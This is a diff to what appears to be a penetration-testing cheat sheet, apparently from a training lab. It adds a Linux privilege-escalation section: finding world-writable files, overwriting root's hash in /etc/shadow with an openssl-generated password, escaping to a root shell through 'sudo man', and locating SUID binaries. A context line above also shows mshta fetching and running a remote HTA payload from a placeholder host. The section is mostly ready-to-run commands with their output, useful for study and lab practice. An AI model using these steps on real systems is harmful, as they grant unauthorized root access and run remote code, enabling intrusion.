@@ -531,4 +531,49 @@ exploit
 mshta.exe http://<ip>:<port>/<filename>.hta
 ```
 
+### Linux Privilege Escalation
+#### Files With Weak Permissions
+```
+find / -not -type l -perm -o+w
+
+ls -al /etc/shadow
+-rw-rw-rw- 1 root shadow 551 Jan  3 15:31 /etc/shadow
+```
+- `-o+w` means others have write permissions
+
+```
+openssl passwd -1 -salt abc password
+$1$abc$BXBqpb9BZcZhXLgbee.0s/
+
+vi /etc/shadow
+root:*:17764:0:99999:7::: --> root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7:::
+
+su
+Password: password
+```
+- Modify `/etc/shadow` by setting root password
+
+#### Sudo Privileges
+```
+sudo -l
+User student may run the following commands on attackdefense:
+    (root) NOPASSWD: /usr/bin/man
+```
+```
+sudo man man
+!/bin/sh
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+- Press `!`, then type `/bin/sh`
+
+#### SUID Binaries
+```
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+
+#### Useful Links
+- https://gtfobins.github.io/
+
 ## Social Engineering
